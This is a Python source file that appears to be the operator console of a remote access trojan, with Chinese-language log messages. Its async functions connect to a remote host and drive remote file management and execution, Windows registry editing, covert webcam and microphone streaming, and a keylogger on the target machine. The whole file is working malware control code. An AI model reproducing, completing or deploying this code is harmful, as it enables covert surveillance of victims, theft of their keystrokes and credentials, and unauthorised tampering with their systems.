import asyncio
from camera import *
from pynput import keyboard
from microphone import *
from keylogger import *
from fileManager import *
from regedit import *

operation_map = {
    "fileManager": "File manager opened",
    "regManager": "Register manager opened",
    "openCamera": "Camera opened",
    "openMicrophone": "Microphone opened",
    "keylogger": "Keylogger started"
}


async def connected(GUI):
    try:
        server_address = (GUI.ipInput.text(), GUI.portInput.text())
        GUI.append_log(
            f"[*] 正在连接到: {server_address[0]}:{server_address[1]}")
        for key in GUI.connections:
            reader, writer = await asyncio.open_connection(*server_address)
            GUI.connections[key]['reader'] = reader
            GUI.connections[key]['writer'] = writer
            operation = key
            writer.write(operation.encode())
            await writer.drain()
            response = await reader.read(1024)
            if (response.decode('utf-8') != operation_map[key]):
                GUI.append_log(
                    f"[!] 操作{operation}响应错误: {response.decode('utf-8')}")
                return
        reader, writer = await asyncio.open_connection(*server_address)
        GUI.append_log(
            f"[*] 已连接到: {server_address[0]}:{server_address[1]}")
    except OSError as e:
        GUI.append_log(f"[!] 网络错误: {e}")
    except Exception as e:
        GUI.append_log(f"[!] 未知错误: {e}")


async def disconnected(GUI):
    for key in GUI.connections:
        GUI.connections[key]['writer'].close()
        await GUI.connections[key]['writer'].wait_closed()
    GUI.append_log("[*] Connection closed")


async def fileManager(GUI, operation):
    # 这里放具体的操作
    GUI.fileList.setEnabled(False)
    GUI.fileDownload.setEnabled(False)
    GUI.fileUpload.setEnabled(False)
    GUI.fileExcute.setEnabled(False)
    try:
        GUI.connections["fileManager"]["writer"]
        GUI.connections["fileManager"]["reader"]
        await clientFileManager(GUI, GUI.connections["fileManager"]["writer"],
                                GUI.connections["fileManager"]["reader"], operation)
    except Exception as e:
        GUI.append_log(f"[!] 文件管理未知错误: {e}")
    finally:
        GUI.fileList.setEnabled(True)
        GUI.fileDownload.setEnabled(True)
        GUI.fileUpload.setEnabled(True)
        GUI.fileExcute.setEnabled(True)

async def regmanager(GUI,action):
    # 这里放具体的操作
    value = GUI.regValueInput.text()
    hive = GUI.regRootKey.text()
    key_path = GUI.regPath.text()
    key_name = GUI.regKeyName.text()

    try:
        if action == "add":
            GUI.append_log("[*] 正在进行注册表添加...")
            GUI.connections["regManager"]["writer"]
            GUI.connections["regManager"]["reader"]
            await send_registry_request(GUI, GUI.connections["regManager"]["writer"],GUI.connections["regManager"]["reader"],'add', hive, key_path, key_name, value)

        elif action == "delete":
            GUI.append_log("[*] 正在删除注册表...")
            GUI.connections["regManager"]["writer"]
            GUI.connections["regManager"]["reader"]
            await send_registry_request(GUI,GUI.connections["regManager"]["writer"],GUI.connections["regManager"]["reader"],'delete', hive, key_path, key_name)

        elif action == "modify":
            GUI.append_log("[*] 正在修改注册表...")
            GUI.connections["regManager"]["writer"]
            GUI.connections["regManager"]["reader"]
            await send_registry_request(GUI,GUI.connections["regManager"]["writer"],GUI.connections["regManager"]["reader"],'modify', hive, key_path, key_name, value)

        elif action == "find":
            GUI.append_log("[*] 正在进行注册表查找...")
            GUI.connections["regManager"]["writer"]
            GUI.connections["regManager"]["reader"]
            await send_registry_request(GUI,GUI.connections["regManager"]["writer"],GUI.connections["regManager"]["reader"],'find', hive, key_path, key_name)

        else:
            print("Unknown action")
    
    except Exception as e:
        GUI.append_log(f"[!] 注册表操作未知错误: {e}")


async def opencamera(GUI):
    try:
        if GUI.openCamera.text() == "开启摄像头":
            GUI.camera_check = True
            operation = "Hello, Server!"
            GUI.connections["openCamera"]["writer"].write(operation.encode())
            await GUI.connections["openCamera"]["writer"].drain()
            GUI.append_log(f"[*] Sent operation: {operation}")

            GUI.append_log("[*] Waiting for response...")
            response = await GUI.connections["openCamera"]["reader"].read(1024)
            GUI.append_log(
                f"[*] Received response: {response.decode('utf-8')}")

            # 切换按钮文本为 "关闭摄像头"
            GUI.openCamera.setText("关闭摄像头")
            # 启动视频流接收
            await receive_video_stream(GUI)
        else:
            # 停止视频流
            GUI.camera_check = False
            GUI.openCamera.setText("开启摄像头")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")


async def openmicrophone(GUI):
    # 这里放具体的操作
    try:
        if GUI.openMicrophone.text() == "开启麦克风":
            GUI.microphone_check = True
            operation = "Hello, Server!"
            GUI.connections["openMicrophone"]["writer"].write(
                operation.encode())
            await GUI.connections["openMicrophone"]["writer"].drain()
            GUI.append_log(f"[*] Sent operation: {operation}")

            GUI.append_log("[*] Waiting for response...")
            response = await GUI.connections["openMicrophone"]["reader"].read(1024)
            GUI.append_log(
                f"[*] Received response: {response.decode('utf-8')}")

            # 切换按钮文本为 "关闭麦克风"
            GUI.openMicrophone.setText("关闭麦克风")
            # 启动语音流接收
            await receive_voice_stream(GUI)
        else:
            # 停止语音流
            GUI.microphone_check = False
            GUI.openMicrophone.setText("开启麦克风")

    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")


async def keylogger(GUI):
    # 这里放具体的操作
    try:
        if GUI.keylogger.text() == "键盘记录":
            GUI.keylogger_check = True
            operation = "start keylogger"
            GUI.connections["keylogger"]["writer"].write(operation.encode())
            await GUI.connections["keylogger"]["writer"].drain()
            GUI.append_log(f"[*] Sent operation: {operation}")

            GUI.append_log("[*] Waiting for response...")
            response = await GUI.connections["keylogger"]["reader"].read(1024)
            GUI.append_log(
                f"[*] Received response: {response.decode('utf-8')}")

            # 切换按钮文本为 "停止键盘记录"
            GUI.keylogger.setText("停止键盘记录")
            # 启动键盘记录接收
            win_manager = KeyloggerManager()
            await receive_keylogger_stream(GUI, win_manager)
        else:
            # 停止键盘记录
            GUI.keylogger_check = False
            GUI.keylogger.setText("键盘记录")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")
